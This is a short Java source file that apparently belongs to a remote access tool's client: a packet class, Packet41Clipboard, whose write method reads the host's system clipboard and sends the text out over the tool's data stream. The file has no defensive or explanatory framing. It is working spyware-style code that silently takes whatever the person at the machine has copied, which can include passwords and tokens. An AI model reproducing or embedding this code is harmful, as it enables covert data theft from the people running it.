package com.redpois0n.packets.outgoing;

import java.awt.Toolkit;
import java.awt.datatransfer.DataFlavor;
import java.io.DataOutputStream;

import com.redpois0n.common.io.StringWriter;

public class Packet41Clipboard extends AbstractOutgoingPacket {

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine((String) Toolkit.getDefaultToolkit().getSystemClipboard().getData(DataFlavor.stringFlavor));
	}

	@Override
	public byte getPacketId() {
		return 41;
	}

}
